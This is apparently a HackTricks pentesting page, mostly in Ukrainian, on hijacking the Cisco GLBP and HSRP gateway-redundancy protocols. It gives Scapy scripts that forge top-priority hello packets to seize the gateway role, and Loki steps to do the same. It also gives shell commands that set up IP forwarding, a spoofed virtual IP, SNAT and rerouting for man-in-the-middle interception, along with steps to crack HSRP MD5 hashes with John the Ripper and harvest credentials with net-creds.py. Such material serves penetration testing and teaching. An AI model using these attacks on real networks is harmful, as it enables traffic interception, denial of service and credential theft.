# GLBP & HSRP Attacks

{{#include ../../banners/hacktricks-training.md}}


## FHRP Hijacking Overview

### Insights into FHRP

FHRP призначено для підвищення надійності мережі шляхом об'єднання кількох маршрутизаторів в один віртуальний блок, що покращує розподіл навантаження та відмовостійкість. Cisco Systems представила в цьому наборі такі протоколи, як GLBP та HSRP.

### GLBP Protocol Insights

GLBP, розроблений Cisco, працює на стеку TCP/IP і використовує UDP на порту 3222 для обміну повідомленнями. Маршрутизатори в групі GLBP обмінюються "hello" пакетами кожні 3 секунди; якщо маршрутизатор не відправляє такі пакети протягом 10 секунд, вважається, що він недоступний. Ці таймери не фіксовані і можуть бути змінені.

GLBP для IPv6 використовує multicast **FF02::66** поверх UDP/3222, а формат віртуальної MAC-адреси стає `0007.b4xx.xxyy` (AVF ID знаходиться в останньому байті). Таймінги та поверхня атаки залишаються такими ж, як у IPv4, тому hijack techniques все ще працюють у dual‑stack мережах.

### GLBP Operations and Load Distribution

GLBP відрізняється тим, що дозволяє розподіляти навантаження між маршрутизаторами, використовуючи одну віртуальну IP-адресу та кілька віртуальних MAC-адрес. У групі GLBP кожен маршрутизатор бере участь у пересиланні пакетів. На відміну від HSRP/VRRP, GLBP забезпечує реальний баланс навантаження за допомогою кількох механізмів:

- **Host-Dependent Load Balancing:** Забезпечує стабільне призначення AVF MAC адреси конкретному хосту, що важливо для стійких NAT конфігурацій.
- **Round-Robin Load Balancing:** За замовчуванням; чергує призначення AVF MAC адрес серед хостів, що роблять запити.
- **Weighted Round-Robin Load Balancing:** Розподіляє навантаження на основі заздалегідь визначених метрик "Weight".

### Key Components and Terminologies in GLBP

- **AVG (Active Virtual Gateway):** Головний маршрутизатор, відповідальний за розподіл MAC-адрес між сусідніми маршрутизаторами.
- **AVF (Active Virtual Forwarder):** Маршрутизатор, призначений для обробки мережевого трафіку.
- **GLBP Priority:** Метрика, яка визначає AVG; за замовчуванням значення 100, діапазон 1–255.
- **GLBP Weight:** Відображає поточне навантаження на маршрутизатор, може налаштовуватися вручну або через Object Tracking.
- **GLBP Virtual IP Address:** Служить шлюзом за замовчуванням мережі для всіх підключених пристроїв.

Для взаємодії GLBP використовує зарезервовану multicast-адресу 224.0.0.102 та UDP порт 3222. Маршрутизатори передають "hello" пакети кожні 3 секунди і вважаються неоперативними, якщо пакет не отримано протягом 10 секунд.

### GLBP Attack Mechanism

Атакуючий може стати головним маршрутизатором, відправивши GLBP пакет із найвищим пріоритетом (255). Це може призвести до DoS або MITM атак, що дозволяє перехоплювати або перенаправляти трафік.

**Практичний GLBP hijack with Scapy (короткий PoC)**
```python
from scapy.all import *

vip = "10.10.100.254"          # learned from sniffing
pkt = IP(dst="224.0.0.102")/UDP(dport=3222,sport=3222)/Raw(
b"\x01\x00\xff\x64"      # Version=1, Opcode=Hello, Priority=255, Weight=100
)
send(pkt, iface="eth0", loop=1, inter=1)
```
Сформуйте байти payload, щоб імітувати GLBP header (version/opcode/priority/weight/VRID). Повторна відправка кадру гарантує вашу перемогу в AVG election, якщо автентифікація відсутня.

### Виконання GLBP Attack з Loki

[Loki](https://github.com/raizo62/loki_on_kali) може виконувати GLBP attack шляхом інжекції пакета з priority та weight, встановленими в 255. Кроки перед атакою включають збір інформації, такої як virtual IP address, наявність authentication і значення priority маршрутизаторів, використовуючи інструменти на кшталт Wireshark.

Attack Steps:

1. Переведіть інтерфейс в promiscuous mode та увімкніть IP forwarding.
2. Визначте цільовий router і отримаєте його IP.
3. Згенеруйте Gratuitous ARP.
4. Інжектуйте зловмисний GLBP packet, видаючись за AVG.
5. Призначте вторинну IP-адресу інтерфейсу атакуючого, яка віддзеркалює GLBP virtual IP.
6. Застосуйте SNAT для повного бачення трафіку.
7. Налаштуйте маршрутизацію, щоб забезпечити подальший доступ в інтернет через оригінальний AVG router.

Дотримуючись цих кроків, атакувальник позиціонує себе як "man in the middle", здатний перехоплювати та аналізувати мережевий трафік, включно з незашифрованими або чутливими даними.

Для демонстрації, нижче наведені необхідні фрагменти команд:
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
Моніторинг та перехоплення трафіку можна виконувати за допомогою net-creds.py або подібних інструментів для захоплення й аналізу даних, що проходять через скомпрометовану мережу.

### Passive Explanation of HSRP Hijacking with Command Details

#### Overview of HSRP (Hot Standby Router/Redundancy Protocol)

HSRP — пропрієтарний протокол Cisco, розроблений для резервування шлюзу мережі. Він дозволяє об’єднати кілька фізичних маршрутизаторів в єдиний логічний елемент із спільною IP-адресою. Цим логічним елементом керує основний маршрутизатор, відповідальний за направлення трафіку. На відміну від GLBP, який використовує метрики, такі як пріоритет і вага, для балансування навантаження, HSRP покладається на один активний маршрутизатор для керування трафіком.

HSRPv1 використовує multicast **224.0.0.2** і віртуальну MAC `0000.0c07.acXX`; HSRPv2 і HSRPv2 для IPv6 використовують **224.0.0.102 / FF02::66** і віртуальну MAC `0000.0c9f.fXXX`. UDP destination port is **1985** for IPv4 and **2029** for IPv6.

#### Roles and Terminology in HSRP

- **HSRP Active Router**: Пристрій, що виступає шлюзом і керує потоком трафіку.
- **HSRP Standby Router**: Резервний маршрутизатор, готовий взяти на себе роль у разі відмови активного маршрутизатора.
- **HSRP Group**: Набір маршрутизаторів, що співпрацюють для створення єдиного відмовостійкого віртуального маршрутизатора.
- **HSRP MAC Address**: Віртуальна MAC-адреса, призначена логічному маршрутизатору в конфігурації HSRP.
- **HSRP Virtual IP Address**: Віртуальна IP-адреса групи HSRP, яка слугує шлюзом за замовчуванням для підключених пристроїв.

#### HSRP Versions

HSRP існує у двох версіях — HSRPv1 та HSRPv2, що відрізняються переважно ємністю груп, використанням multicast IP та структурою віртуальної MAC-адреси. Протокол використовує конкретні multicast IP-адреси для обміну службовою інформацією, Hello-пакети надсилаються кожні 3 секунди. Маршрутизатор вважається неактивним, якщо впродовж 10 секунд не отримано жодного пакета.

#### HSRP Attack Mechanism

Атаки на HSRP полягають у насильницькому захопленні ролі Active Router шляхом інжекції максимального значення пріоритету. Це може призвести до Man-In-The-Middle (MITM) атаки. Важливі підготовчі кроки перед атакою включають збір інформації про налаштування HSRP, що можна зробити за допомогою Wireshark для аналізу трафіку.

**Quick HSRP takeover with Scapy**
```python
from scapy.all import *

vip = "10.10.100.1"
pkt = IP(dst="224.0.0.102")/UDP(sport=1985,dport=1985)/Raw(
b"\x00\x02\xff\x03\x00\x00\x00\x01"  # Hello, priority 255, group 1
)
send(pkt, iface="eth0", inter=1, loop=1)
```
Якщо автентифікація **не** налаштована, постійне надсилання hello-повідомлень з вищим пріоритетом змушує peers перейти в стани *Speak*/*Listen* і дозволяє вам стати *Active*, перенаправляючи трафік через ваш хост.

**Особливі випадки автентифікації HSRP**

- Legacy plain-text auth легко підробити.
- MD5 authentication захищає тільки HSRP payload; crafted packets все ще можуть викликати rate-limit/DoS для площини керування. Деякі релізи NX-OS раніше дозволяли DoS проти аутентифікованих груп (див. Cisco advisory CSCup11309).
- На багатьох ISP / VPS спільних VLAN HSRPv1 multicasts видимі для tenants; без автентифікації ви можете приєднатись і preempt трафік.

#### Кроки для обходу автентифікації HSRP

1. Збережіть мережевий трафік, що містить дані HSRP, у .pcap файл.
```shell
tcpdump -w hsrp_traffic.pcap
```
2. Витягніть MD5-хеші з .pcap файлу за допомогою hsrp2john.py.
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. Зламайте MD5-хеші за допомогою John the Ripper.
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Виконання HSRP-інжекції за допомогою Loki**

1. Запустіть Loki, щоб виявити HSRP advertisements.
2. Встановіть мережевий інтерфейс у promiscuous режим і увімкніть IP forwarding.
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Використайте Loki для націлювання на конкретний роутер, введіть зламаний HSRP-пароль і виконайте необхідні налаштування, щоб видавати себе за Active Router.
4. Після отримання ролі Active Router налаштуйте ваш мережевий інтерфейс та iptables для перехоплення легітимного трафіку.
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. Змініть таблицю маршрутів, щоб направляти трафік через попередній Active Router.
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. Використайте net-creds.py або аналогічну утиліту для збирання облікових даних із перехопленого трафіку.
```shell
sudo python2 net-creds.py -i eth0
```

Виконання цих кроків ставить атакувальника в позицію для перехоплення та маніпулювання трафіком, аналогічно процедурі GLBP hijacking. Це підкреслює вразливість протоколів резервування, таких як HSRP, і потребу в надійних заходах безпеки.

## References

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- [Cisco NX-OS HSRP authentication DoS (CSCup11309)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/Cisco-SA-20140611-CVE-2014-3295)
- [Reddit: HSRP seen on VPS shared VLANs](https://www.reddit.com/r/networking/comments/1h0v1aq/hsrp_seen_on_cloud_vlans_without_auth/)
{{#include ../../banners/hacktricks-training.md}}
